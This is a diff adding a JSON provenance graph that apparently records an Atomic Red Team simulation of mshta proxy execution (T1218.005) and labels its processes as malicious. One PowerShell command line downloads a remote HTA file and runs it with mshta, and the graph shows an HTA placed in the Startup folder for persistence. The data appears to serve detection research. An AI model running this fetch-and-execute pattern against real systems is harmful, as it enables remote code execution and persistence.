@@ -1,0 +1,217 @@
+{
+  "nodes": [
+    {
+      "id": "Process:mshta|9b01daa5",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5353-6008-3006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:explorer|536d9349",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5353-6008-2F06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:svchost|d581e2cc",
+      "type": "Process",
+      "properties": {
+        "label": "svchost",
+        "image": "%WINDIR%\\System32\\svchost.exe",
+        "guid": "{7901BC46-4986-6008-0C00-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:powershell|63710f57",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{7901BC46-53CF-6008-9B06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:f69b3a4e74b8b840",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
+      }
+    },
+    {
+      "id": "Network:bc22f587c8116e9b",
+      "type": "Network",
+      "properties": {
+        "address": "151.101.52.133",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "File:1f586730",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\Test.hta",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\test.hta"
+      }
+    },
+    {
+      "id": "File:0318a4be",
+      "type": "File",
+      "properties": {
+        "path": "C:\\Temp\\notepad.exe",
+        "path_normalized": "c:\\temp\\notepad.exe"
+      }
+    },
+    {
+      "id": "File:abcfaec4",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta",
+        "path_normalized": "c:\\users\\[user]\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\t1218.005.hta"
+      }
+    },
+    {
+      "id": "Network:8e8fb8f057a53c8f",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\\"
+      }
+    },
+    {
+      "id": "Process:cmd|85463a0e",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c calc.exe",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{732C744F-3255-6010-D1A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:0961b32756d7a709",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://gist.githubusercontent.com/MHaggis/a008d2d6a84fd7a28bee0135dcf28802/raw/f4750734bd61bad087b54c5a3c4fa4e6d9fd1b94/test.hta\\"
+      }
+    },
+    {
+      "id": "File:a2127e9d",
+      "type": "File",
+      "properties": {
+        "path": "C:\\Temp\\test.hta",
+        "path_normalized": "c:\\temp\\test.hta"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "source": "Process:explorer|536d9349",
+      "target": "Process:mshta|9b01daa5",
+      "operations": []
+    },
+    {
+      "source": "Process:svchost|d581e2cc",
+      "target": "Process:explorer|536d9349",
+      "operations": []
+    },
+    {
+      "source": "Process:svchost|d581e2cc",
+      "target": "Process:mshta|9b01daa5",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Process:powershell|63710f57",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Network:f69b3a4e74b8b840",
+      "operations": []
+    },
+    {
+      "source": "Process:mshta|9b01daa5",
+      "target": "Process:powershell|63710f57",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "File:1f586730",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "File:0318a4be",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Process:mshta|9b01daa5",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "File:abcfaec4",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Network:8e8fb8f057a53c8f",
+      "operations": []
+    },
+    {
+      "source": "Process:mshta|9b01daa5",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Network:0961b32756d7a709",
+      "operations": []
+    },
+    {
+      "source": "Process:explorer|536d9349",
+      "target": "Process:cmd|85463a0e",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "File:a2127e9d",
+      "operations": []
+    },
+    {
+      "source": "Process:powershell|63710f57",
+      "target": "Network:bc22f587c8116e9b",
+      "operations": []
+    }
+  ],
+  "metadata": {
+    "version": "v3.0-aggregated",
+    "aggregation_stats": {
+      "original_nodes": 32,
+      "original_edges": 28,
+      "removed_noise_nodes": 0,
+      "removed_noise_edges": 0,
+      "merged_nodes": 19,
+      "final_nodes": 13,
+      "final_edges": 16
+    }
+  }
+}
